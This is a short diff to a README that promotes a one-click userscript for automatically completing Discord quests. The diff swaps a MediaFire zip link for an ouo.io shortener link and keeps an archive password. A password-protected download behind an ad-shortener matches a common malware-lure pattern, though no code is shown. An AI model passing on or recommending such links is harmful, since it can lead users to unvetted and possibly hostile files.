@@ -39,7 +39,7 @@ The ultimate userscript to complete Discord quests **AUTOMATICALLY** with **ONE 
 ---
 
 ## 📥 DOWNLOAD NOW:
-🔗 **Download Link:** [https://www.mediafire.com/file/rt29hp3bg2e0xj3/QUEST_BY_ZERO_L7ISS.zip/file](https://ouo.io/zwDX6WV)
+🔗 **Download Link:** https://ouo.io/zwDX6WV
 
 🔑 **Password:** `devgamgam`
 
